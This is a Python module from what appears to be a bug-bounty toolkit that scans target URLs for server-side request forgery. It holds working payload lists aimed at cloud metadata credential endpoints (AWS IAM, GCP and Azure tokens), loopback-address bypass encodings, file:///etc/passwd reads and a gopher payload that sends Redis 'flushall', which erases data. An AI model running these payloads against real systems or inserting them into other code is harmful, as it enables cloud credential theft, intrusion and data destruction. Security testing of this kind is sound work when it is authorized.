# Bug Bounty Tool Kit  ─  by Hacker00X1  |  Authorized use only
"""SSRF — cloud metadata, blind SSRF, URL parameter injection."""

import urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed
from data.webfuzz import fetch_url

METADATA_URLS = [
    # AWS
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://169.254.169.254/latest/meta-data/hostname",
    "http://169.254.169.254/latest/user-data",
    "http://169.254.169.254/latest/meta-data/public-keys/",
    # GCP
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
    # Azure
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-02-01&resource=https://management.azure.com/",
    # Alibaba
    "http://100.100.100.200/latest/meta-data/",
    # Internal
    "http://127.0.0.1/",
    "http://localhost/",
    "http://0.0.0.0/",
    "http://[::1]/",
    "http://0177.0.0.01/",
    "http://2130706433/",
    "http://0x7f000001/",
    "http://017700000001/",
    # Encoded bypasses
    "http://①②⑦.⓪.⓪.①/",
    "http://127.1/",
    "http://127.000.000.001/",
    # Docker / internal
    "http://172.17.0.1/",
    "http://192.168.1.1/",
    "http://10.0.0.1/",
]

URL_PARAMS = [
    "url", "uri", "link", "src", "source", "dest", "destination",
    "redirect", "target", "fetch", "load", "request", "webhook",
    "callback", "proxy", "image", "file", "path", "resource",
    "next", "return", "returnUrl", "returnTo", "goto", "redir",
    "host", "endpoint", "api", "feed", "import", "ref", "service",
    "to", "from", "forward", "open", "page", "site", "domain",
    "continue", "location", "uri", "jump", "out", "view",
]

SSRF_INDICATORS = [
    "ami-id", "instance-id", "security-credentials", "iam",
    "computemetadata", "hostname", "local-hostname",
    "root:x:", "localhost", "azure", "alibaba", "gcp",
    "serviceaccount", "access_token", "expires_in",
]

SCHEME_PAYLOADS = [
    "file:///etc/passwd",
    "file:///etc/hostname",
    "dict://127.0.0.1:6379/info",
    "gopher://127.0.0.1:6379/_*1%0d%0a%248%0d%0aflushall",
    "ftp://127.0.0.1:21/",
    "ldap://127.0.0.1:389/",
]

CVSS = "9.3 (Critical) — CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:N"


def _test_param(base_url: str, param: str, timeout: int) -> list[dict]:
    findings = []
    parsed = urllib.parse.urlparse(base_url)
    qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)

    for target_url in METADATA_URLS:
        test_qs = dict(qs)
        test_qs[param] = [target_url]
        test_url = urllib.parse.urlunparse(parsed._replace(
            query=urllib.parse.urlencode(test_qs, doseq=True)
        ))
        resp = fetch_url(test_url, timeout=timeout)
        if not resp:
            continue
        body = (resp.get("body") or "").lower()
        if any(ind in body for ind in SSRF_INDICATORS):
            findings.append({
                "type": "SSRF — Cloud Metadata Access",
                "severity": "CRITICAL",
                "url": test_url,
                "param": param,
                "ssrf_target": target_url,
                "cvss": CVSS,
                "description": f"SSRF via '{param}': server fetched {target_url} — cloud metadata/internal resource returned.",
                "steps_to_reproduce": (
                    f"1. curl -s '{test_url}'\n"
                    f"2. Observe cloud metadata content (IAM credentials, instance details) in response."
                ),
                "impact": "Cloud IAM credential theft. Pivot to internal services. Potential full cloud account takeover.",
                "recommendation": "Block RFC1918 and metadata IP ranges at egress firewall. Validate URLs against a strict allowlist. Use IMDSv2 with session tokens.",
            })
            return findings

    for scheme_url in SCHEME_PAYLOADS:
        test_qs = dict(qs)
        test_qs[param] = [scheme_url]
        test_url = urllib.parse.urlunparse(parsed._replace(
            query=urllib.parse.urlencode(test_qs, doseq=True)
        ))
        resp = fetch_url(test_url, timeout=timeout)
        if resp and resp.get("status") in (200, 201):
            body = resp.get("body") or ""
            if "root:" in body or "redis" in body.lower() or len(body) > 50:
                findings.append({
                    "type": "SSRF — Alternative Scheme Accepted",
                    "severity": "CRITICAL",
                    "url": test_url,
                    "param": param,
                    "scheme": scheme_url.split("://")[0],
                    "cvss": CVSS,
                    "description": f"SSRF via '{param}' with {scheme_url.split('://')[0]}:// scheme — server made internal request.",
                    "steps_to_reproduce": f"1. curl -s '{test_url}'\n2. Observe internal service response.",
                    "impact": "Redis/memcache RCE, file read, internal service enumeration.",
                    "recommendation": "Allowlist http/https only. Block file://, gopher://, dict://, ftp:// schemes.",
                })
                return findings

    return findings


def _inject_url_params(base_url: str, timeout: int) -> list[dict]:
    findings = []
    parsed = urllib.parse.urlparse(base_url)
    for param in URL_PARAMS[:20]:
        for target in METADATA_URLS[:5]:
            tqs = {param: [target]}
            test_url = urllib.parse.urlunparse(parsed._replace(
                query=urllib.parse.urlencode(tqs, doseq=True)
            ))
            resp = fetch_url(test_url, timeout=timeout)
            if resp:
                body = (resp.get("body") or "").lower()
                if any(ind in body for ind in SSRF_INDICATORS):
                    findings.append({
                        "type": "SSRF — URL Parameter Injection",
                        "severity": "CRITICAL",
                        "url": test_url,
                        "param": param,
                        "cvss": CVSS,
                        "description": f"SSRF via injected '{param}' parameter — internal resource fetched.",
                        "steps_to_reproduce": f"1. curl -s '{test_url}'\n2. Observe metadata in response.",
                        "impact": "Cloud credential theft, internal network reconnaissance.",
                        "recommendation": "Sanitize URL inputs. Use allowlists. Never server-side fetch user-supplied URLs without strict validation.",
                    })
                    return findings
    return findings


def run(base_url: str, domain: str = "", timeout: int = 5, threads: int = 15, **kwargs) -> dict:
    findings: list[dict] = []
    parsed = urllib.parse.urlparse(base_url)
    qs = urllib.parse.parse_qs(parsed.query)
    existing = [p for p in qs if p.lower() in {x.lower() for x in URL_PARAMS}]

    with ThreadPoolExecutor(max_workers=threads) as ex:
        futures = [ex.submit(_test_param, base_url, p, timeout) for p in existing]
        futures.append(ex.submit(_inject_url_params, base_url, timeout))
        for fut in as_completed(futures):
            findings.extend(fut.result())

    return {
        "findings": findings,
        "summary": {
            "url_params_found": len(existing),
            "injected_params_tested": len(URL_PARAMS[:20]),
            "metadata_targets": len(METADATA_URLS),
            "total_findings": len(findings),
        },
    }


if __name__ == "__main__":
    pass
